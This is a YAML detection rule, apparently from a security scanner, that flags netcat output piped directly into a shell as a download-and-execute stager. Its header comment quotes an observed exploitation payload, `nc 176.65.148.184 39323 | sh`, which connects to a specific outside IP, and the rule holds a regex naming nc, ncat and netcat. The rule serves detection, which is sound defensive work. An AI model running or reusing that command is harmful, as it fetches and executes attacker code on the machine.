# Remote stream piped directly into a shell over netcat.
#
# `nc <host> <port> | sh` connects outbound to an operator listener and hands
# the received bytes straight to a shell interpreter: download-and-execute
# without curl/wget. Observed as the initial stager of the Switchvox
# CVE-2026-9586 exploitation (Horizon3.ai honeypots, Aug 2026: the payload
# `nc 176.65.148.184 39323 | sh` delivered through PostgreSQL COPY TO
# PROGRAM). Distinct from the FIFO and -e reverse-shell forms already covered
# under reverse-shell/: nothing is echoed back, the stream itself is the code.
defaults:
  platforms: [unix]
  for: [shell, text, python, javascript, typescript]
  attack: T1059.004

traits:
  - id: nc-remote-stream-pipe-shell
    desc: netcat stream piped into shell
    crit: suspicious
    conf: 0.93
    if:
      type: text
      regex: '\b(nc|ncat|netcat)\b\s+[-\w.]{1,80}\s+\d{2,5}\s*\|\s*(/usr/bin/|/bin/)?(ba)?sh\b'
